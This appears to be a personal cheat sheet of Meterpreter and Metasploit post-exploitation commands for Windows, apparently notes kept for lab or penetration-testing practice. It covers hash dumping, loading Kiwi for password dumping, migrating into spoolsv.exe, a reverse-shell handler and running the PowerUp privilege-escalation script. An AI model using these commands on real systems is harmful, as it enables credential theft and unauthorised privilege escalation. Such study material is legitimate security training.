# Commands

equivalent of whoami; NT AUTHORITY/SYSTEM is equivalent of admin
`getuid`

get working proccess number
`getpid`

change directory/print working directory/see files
`cd/pwd/cat`

go down to windows cmd (not needed if we are already admin)
`shell`

list out processes
`ps`

migrate to proccess (requires equivalent or higher permissions)
`migrate (proccess ID)
`spoolsv.exe is good to migrate to`

show system info
`sysinfo`

dump hashes
`hashdump`

`search -f *[extension]`

can be ran in meterpreter or msfconsole (suggests exploits based off provided info)
`run post/multi/recon/local_exploit_suggester`
## Reverse Shell with Metasploit
	auxiliary/multi/handler

## KIWI
meterpreter password dumping tool that can be loaded in using 
`load kiwi`




# Notes
try to get into `spoolsv.exe`

## PowerUp powershell script (.ps1)
the powerup ps1 script evaluates a windows machine and determines abnormalities (used for common windows privilege escalation based on misconfigurations)

[PowerUpSript](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

`meterpreter > upload [/filelocation/PowerUpFile.ps1`
upload the PowerUp script file 

`meterpreter > load powershell`
loads up powershell

`meterpreter > powershell_shell`
enter powershell

`PS > . .\[PowerUpFile.ps1]`
runs the powershell powerup script

`PS > Invoke-AllChecks`

